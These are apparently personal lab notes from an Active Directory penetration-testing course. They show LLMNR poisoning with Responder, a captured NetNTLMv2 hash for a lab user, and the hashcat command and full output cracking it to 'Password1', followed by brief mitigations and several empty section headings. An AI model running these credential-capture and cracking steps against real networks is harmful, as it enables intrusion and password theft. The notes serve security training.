# Attacking Active Directory: Initial Attack Vectors

## Introduction

Abusing Windows features.
https://adam-toscher.medium.com/top-five-ways-i-got-domain-admin-on-your-internal-network-before-lunch-2018-edition-82259ab73aaa

## LLMNR Poisoning Overview

- used to identify hosts when DNS fails to do so.
- response includes a username and password hash.
- run responder early in the morning or after lunch. When an event occurs, we get usernames and dem hashes. We can crak these hashes with hashcat.

## Capturing Hashes with Responder

- on kali, run your listener with `responder -I eth0 -w -d -v`
- on fcastle machine, open explorer and try to connect to your kali ip: `//your-kali-ip`
- it should be intercepted:

```
[SMB] NTLMv2-SSP Username : MARVEL\fcastle
[SMB] NTLMv2-SSP Hash     : fcastle::MARVEL:2609515b2bb25e5a:F76239F7204A69D49A77B4EF98D6357C:01010000000000000066564B52E2DA01576913D4783F58F60000000002000800370050005000510001001E00570049004E002D004E0037004E004C004A0034003100300048005300520004003400570049004E002D004E0037004E004C004A003400310030004800530052002E0037005000500051002E004C004F00430041004C000300140037005000500051002E004C004F00430041004C000500140037005000500051002E004C004F00430041004C00070008000066564B52E2DA0106000400020000000800300030000000000000000000000000200000535A1B52C70E295C65366BFC5AF851D34870F09AF82762BEA1B979D4D996ED2B0A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00390032002E003100320038000000000000000000
```

## Cracking Our Captured Hashes

- copy the hash and save it to a file with `gedit ntlmhash.txt`
- `hashcat --help` to know the code for the hash algorithms, or `hashcat --help | grep NTLM`:

```
   5500 | NetNTLMv1 / NetNTLMv1+ESS                                  | Network Protocol
  27000 | NetNTLMv1 / NetNTLMv1+ESS (NT)                             | Network Protocol
   5600 | NetNTLMv2                                                  | Network Protocol
  27100 | NetNTLMv2 (NT)                                             | Network Protocol
   1000 | NTLM                                                       | Operating System
```

- wordlists: https://github.com/danielmiessler/SecLists (rockyou is sufficient for ctf challenges)
- run `hashcat -m 5600 ntlmhash.txt /usr/share/wordlists/rockyou.txt --force`

```
hashcat (v6.2.6) starting

You have enabled --force to bypass dangerous warnings and errors!
This can hide serious problems and should only be done when debugging.
Do not report hashcat issues encountered when using --force.

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: cpu-sandybridge-AMD Ryzen 7 8845HS w/ Radeon 780M Graphics, 1435/2935 MB (512 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 2 secs

FCASTLE::MARVEL:2609515b2bb25e5a:f76239f7204a69d49a77b4ef98d6357c:01010000000000000066564b52e2da01576913d4783f58f60000000002000800370050005000510001001e00570049004e002d004e0037004e004c004a0034003100300048005300520004003400570049004e002d004e0037004e004c004a003400310030004800530052002e0037005000500051002e004c004f00430041004c000300140037005000500051002e004c004f00430041004c000500140037005000500051002e004c004f00430041004c00070008000066564b52e2da0106000400020000000800300030000000000000000000000000200000535a1b52c70e295c65366bfc5af851d34870f09af82762bea1b979d4d996ed2b0a001000000000000000000000000000000000000900260063006900660073002f003100390032002e003100360038002e00390032002e003100320038000000000000000000:Password1

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: FCASTLE::MARVEL:2609515b2bb25e5a:f76239f7204a69d49a...000000
Time.Started.....: Tue Jul 30 08:10:07 2024, (1 sec)
Time.Estimated...: Tue Jul 30 08:10:08 2024, (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    43570 H/s (0.97ms) @ Accel:256 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 4096/14344385 (0.03%)
Rejected.........: 0/4096 (0.00%)
Restore.Point....: 3072/14344385 (0.02%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: adriano -> oooooo
Hardware.Mon.#1..: Util: 26%

Started: Tue Jul 30 08:09:30 2024
Stopped: Tue Jul 30 08:10:09 2024
```

- better to run it directly on your machine. https://hashcat.net/hashcat/

## c Poisoning Mitigation

- disable LLMNR/NBT-NS.
- if it's not possible, require network access control and require strong user passwords (>14 characters and limit common word usage).

## SMB Relay Attacks Overview

## SMB Relay Attacks Lab

## SMB Relay Attack Defenses

## Gaining Shell Access

## IPv6 Attacks Overview

## IPv6 DNS Takeover via mitm6

## IPv6 Attack Defenses

## Passback Attacks

## Initial Internal Attack Strategy
